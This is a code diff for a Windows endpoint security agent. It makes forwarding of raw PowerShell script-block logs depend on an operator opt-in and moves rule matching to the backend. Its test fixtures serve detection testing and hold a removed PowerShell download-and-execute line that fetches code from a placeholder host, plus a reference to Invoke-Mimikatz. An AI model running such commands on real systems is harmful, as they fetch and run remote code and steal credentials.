@@ -457,35 +457,40 @@ fn audit_tamper_event(
     )
 }
 
-/// Findings for one PowerShell 4104 record. The raw record is not kept.
-fn script_block_events(data: &LogEventData, agent_id: &str, hostname: &str) -> Vec<AgentEvent> {
+/// The raw PowerShell 4104 record, only when the operator opted in
+/// (`script_block_capture_enabled`). Script text can contain credentials, so
+/// without the opt-in the record is dropped on the host. Rule matching on the
+/// text happens in the backend, not here.
+fn script_block_events(
+    data: &LogEventData,
+    agent_id: &str,
+    hostname: &str,
+    capture: bool,
+) -> Vec<AgentEvent> {
     let is_4104 = data.fields.get("EventID").and_then(|v| v.as_u64()) == Some(4104)
         && data.source_path == windows_native::POWERSHELL_CHANNEL
         && data.proc.as_deref() == Some("Microsoft-Windows-PowerShell");
-    let text = data
+    let has_text = data
         .fields
         .get("ScriptBlockText")
         .and_then(|v| v.as_str())
-        .unwrap_or("");
-    if !is_4104 || text.is_empty() {
+        .is_some_and(|t| !t.is_empty());
+    if !capture || !is_4104 || !has_text {
         return Vec::new();
     }
-    trapd_detection::windows_script_rules::inspect_script_block(text)
-        .into_iter()
-        .filter_map(|d| {
-            native_provenance(
-                AgentEvent::new(
-                    agent_id.into(),
-                    hostname.into(),
-                    EventClass::Detection,
-                    EventAction::Detected,
-                    Severity::Medium,
-                    EventData::Detection(Box::new(d)),
-                ),
-                data,
-            )
-        })
-        .collect()
+    native_provenance(
+        AgentEvent::new(
+            agent_id.into(),
+            hostname.into(),
+            EventClass::Log,
+            EventAction::Log,
+            Severity::Info,
+            EventData::Log(Box::new(data.clone())),
+        ),
+        data,
+    )
+    .into_iter()
+    .collect()
 }
 
 pub struct EventLogCollector {
@@ -537,6 +542,11 @@ impl Collector for EventLogCollector {
                 });
                 continue;
             }
+            let capture_script_blocks = self
+                .config
+                .read()
+                .map(|c| c.script_block_capture_enabled)
+                .unwrap_or(false);
             let policy = tokio::task::spawn_blocking(|| {
                 let command_line = super::registry::values_checked(
                     super::registry::Hive::LocalMachine,
@@ -643,12 +653,17 @@ impl Collector for EventLogCollector {
                             continue;
                         }
                     };
-                    // Script blocks are judged locally and never forwarded: only the
-                    // findings leave the host. Like the other channels, the first
-                    // start tails from the newest record without replaying history.
+                    // Script blocks leave the host only with the operator's opt-in.
+                    // Like the other channels, the first start tails from the
+                    // newest record without replaying history.
                     if channel == windows_native::POWERSHELL_CHANNEL {
                         if cursor.is_some() {
-                            for ev in script_block_events(&data, &agent_id, &hostname) {
+                            for ev in script_block_events(
+                                &data,
+                                &agent_id,
+                                &hostname,
+                                capture_script_blocks,
+                            ) {
                                 if tx.send(ev).await.is_err() {
                                     return Ok(());
                                 }
@@ -782,19 +797,20 @@ impl Collector for EventLogCollector {
 #[cfg(test)]
 mod tests {
     #[test]
-    fn script_blocks_yield_findings_without_the_script_text() {
+    fn script_blocks_are_dropped_unless_capture_is_enabled() {
         let xml = "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System>\
 <Provider Name='Microsoft-Windows-PowerShell'/><EventID>4104</EventID>\
 <TimeCreated SystemTime='2026-10-10T17:25:49.1747246Z'/><EventRecordID>9</EventRecordID>\
 <Computer>H</Computer></System><EventData>\
-<Data Name='ScriptBlockText'>$p='Password123-do-not-leak'; IEX (New-Object Net.WebClient).DownloadString('http://x')</Data>\
-</EventData></Event>";
+<Data Name='ScriptBlockText'>Write-Output hello</Data></EventData></Event>";
         let (_, data, _) = parse(xml, windows_native::POWERSHELL_CHANNEL).unwrap();
-        let evs = script_block_events(&data, "a", "h");
+        assert!(script_block_events(&data, "a", "h", false).is_empty());
+        let evs = script_block_events(&data, "a", "h", true);
         assert_eq!(evs.len(), 1);
-        let dump = serde_json::to_string(&evs[0]).unwrap();
-        assert!(!dump.contains("Password123"), "{dump}");
-        assert!(dump.contains("execution.powershell_download_exec"));
+        assert!(matches!(evs[0].class, EventClass::Log));
+        assert!(
+            matches!(&evs[0].data, EventData::Log(l) if l.fields["ScriptBlockText"] == "Write-Output hello")
+        );
     }
 
     #[test]
@@ -804,7 +820,7 @@ mod tests {
 <TimeCreated SystemTime='2026-10-10T17:25:49.1747246Z'/><EventRecordID>9</EventRecordID>\
 <Computer>H</Computer></System><EventData><Data Name='ScriptBlockText'>Invoke-Mimikatz</Data></EventData></Event>";
         let (_, data, _) = parse(xml, windows_native::POWERSHELL_CHANNEL).unwrap();
-        assert!(script_block_events(&data, "a", "h").is_empty());
+        assert!(script_block_events(&data, "a", "h", true).is_empty());
     }
 
     #[test]
